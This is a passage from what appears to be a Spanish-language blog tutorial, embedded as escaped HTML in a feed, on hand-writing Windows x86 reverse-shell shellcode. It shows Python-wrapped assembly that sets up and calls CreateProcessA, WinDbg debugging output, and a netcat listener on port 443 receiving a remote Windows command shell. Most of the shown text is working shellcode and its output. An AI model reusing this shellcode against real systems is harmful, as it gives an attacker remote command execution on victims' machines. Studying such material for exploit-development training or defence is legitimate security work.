&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push edi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpStartupInfo
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor eax, eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpCurrentDirectory
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpEnvironment
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta dwCreationFlags
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;inc eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Pone EAX en 1 (TRUE)
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta bInheritHandles
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;dec eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null EAX otra vez
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpThreadAttributes
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpProcessAttributes
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push ebx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpCommandLine
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpApplicationName
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call dword ptr [ebp+0x1c];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;           &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llamar a  CreateProcessA
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;La función call_createprocessa comienza moviendo el registro ESP a EAX y restándole &lt;code&gt;0x390&lt;&#x2F;code&gt; con la ayuda de ECX. Este es el mismo paso que realizamos al llamar a la API &lt;code&gt;WSAStartup&lt;&#x2F;code&gt; , que rellenó la estructura WSADATA.&lt;&#x2F;p&gt;
&lt;p&gt;A continuación, insertamos un puntero a la estructura STARTUPINFOA que almacenamos previamente en EDI. Esta instrucción va seguida de tres dwords nulos, que establecen los tres argumentos siguientes.&lt;&#x2F;p&gt;
&lt;p&gt;Luego, aumentamos EAX, haciendo que el registro contenga el valor &lt;code&gt;0x01&lt;&#x2F;code&gt; (TRUE) y lo enviamos como argumento &lt;code&gt;bInheritHandles&lt;&#x2F;code&gt; . Después, disminuimos el registro, restableciéndolo a nulo, y enviamos dos dwords nulos.&lt;&#x2F;p&gt;
&lt;p&gt;La línea que contiene &lt;code&gt;&quot;push ebx;&quot;&lt;&#x2F;code&gt; (lpCommandLine), requiere un puntero a una cadena que representa el comando a ejecutar, se inserta en la pila mediante el registro EBX definido en un paso anterior. Finalmente, establecemos el argumento &lt;code&gt;lpApplicationName&lt;&#x2F;code&gt; en nulo y llamamos a la API.&lt;&#x2F;p&gt;
&lt;p&gt;Para comprobar que funciona correctamente, establezcamos un punto de interrupción en la llamada a &lt;code&gt;CreateProccesA&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; bp 012a016c
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ModLoad: 74c40000 74c96000   C:\Windows\system32\mswsock.dll
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00000000 ebx=02f9f26c ecx=00000390 edx=77573060 esi=00000218 edi=02f9f274
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=012a016c esp=02f9f244 ebp=02f9f8fc iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;012a016c ff551c          call    dword ptr [ebp+1Ch]  ss:0023:02f9f918={KERNEL32!CreateProcessAStub (773d7570)}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00000001 ebx=02f9f26c ecx=b76b73f3 edx=012b0000 esi=00000218 edi=02f9f274
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=012a016f esp=02f9f26c ebp=02f9f8fc iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;012a016f 0000            add     byte ptr [eax],al          ds:0023:00000001=??
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Conexion establecida:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dreamer@debian:~&#x2F;$ sudo nc -lvnp 443
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Listening on 0.0.0.0 443
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Connection received on 192.168.1.131 50366
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Microsoft Windows [Versi�n 10.0.19045.6456]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(c) Microsoft Corporation. Todos los derechos reservados.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;C:\Users\dreamer\AppData\Local\Programs\Python\Python39-32&amp;gt; whoami
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;desktop-jk4rmt8\dreamner
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;referencias&quot;&gt;Referencias&lt;a class=&quot;zola-anchor&quot; href=&quot;#referencias&quot; aria-label=&quot;Anchor link for: referencias&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;https:&#x2F;&#x2F;learn.microsoft.com&#x2F;en-us&#x2F;archive&#x2F;msdn-magazine&#x2F;2002&#x2F;february&#x2F;inside-windows-win32-portable-executable-file-format-in-detail&lt;&#x2F;li&gt;
&lt;li&gt;https:&#x2F;&#x2F;learn.microsoft.com&#x2F;es-es&#x2F;windows&#x2F;win32&#x2F;api&#x2F;winsock&#x2F;nf-winsock-wsastartup&lt;&#x2F;li&gt;
&lt;li&gt;https:&#x2F;&#x2F;learn.microsoft.com&#x2F;es-es&#x2F;windows&#x2F;win32&#x2F;api&#x2F;winsock2&#x2F;nf-winsock2-wsaconnect&lt;&#x2F;li&gt;
&lt;li&gt;https:&#x2F;&#x2F;learn.microsoft.com&#x2F;es-es&#x2F;windows&#x2F;win32&#x2F;api&#x2F;processthreadsapi&#x2F;nf-processthreadsapi-createprocessa&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
</feed>
